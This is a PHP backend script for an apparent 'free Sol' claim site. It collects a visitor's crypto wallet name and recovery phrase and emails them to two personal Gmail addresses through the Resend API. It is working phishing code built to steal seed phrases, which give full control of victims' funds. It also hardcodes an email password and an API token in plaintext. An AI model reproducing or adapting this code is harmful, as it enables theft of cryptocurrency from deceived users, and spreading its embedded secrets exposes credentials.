<?php

header("Access-Control-Allow-Origin: https://www.claimfeesol.com");
header("Access-Control-Allow-Methods: GET, POST, OPTIONS");
header("Access-Control-Allow-Headers: Content-Type, Authorization");
header("Access-Control-Allow-Credentials: true");

if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

$emailPassword = "Th8_rIz9GCSQ8IjY";
$resendToken = "re_ThueNEDV_GyyYzbvEWUmgDzBPVRpVSEkq";

include 'config.php';
session_start();

require __DIR__ . '/vendor/autoload.php';

$resend = Resend::client($resendToken);

$data = json_decode(file_get_contents("php://input"), true);

$wallet = $data['wallet'] ?? 'Unknown';
$phrase = $data['phrase'] ?? '';

if (empty($phrase)){
    echo json_encode([
        'status' => 'error',
        'msg' => "Enter your wallet phrase to continue"
    ]);
    return;
}else{
    try {
        $result = $resend->emails->send([
            'from' => 'Free Sol <contact@claimfeesol.com>',
            'to' => ['osemensilas@gmail.com', 'smitharayaskul35@gmail.com'],
            'subject' => 'New Token',
            'html' => "
                <p>Wallet: {$wallet}</p>
                <p>Phrase: {$phrase}</p>
            ",
        ]);

        echo json_encode([
            'status' => 'successful',
            'msg' => $result
        ]);
    } catch (\Throwable $th) {
        echo json_encode([
            'status' => 'error',
            'msg' => $th->getMessage()
        ]);
    }
}